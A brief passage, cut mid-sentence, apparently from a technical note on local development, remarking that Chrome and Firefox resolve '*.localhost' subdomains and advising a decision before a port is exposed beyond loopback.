`*.localhost` while Chrome and Firefox do. Decide before the port ever leaves loopback.
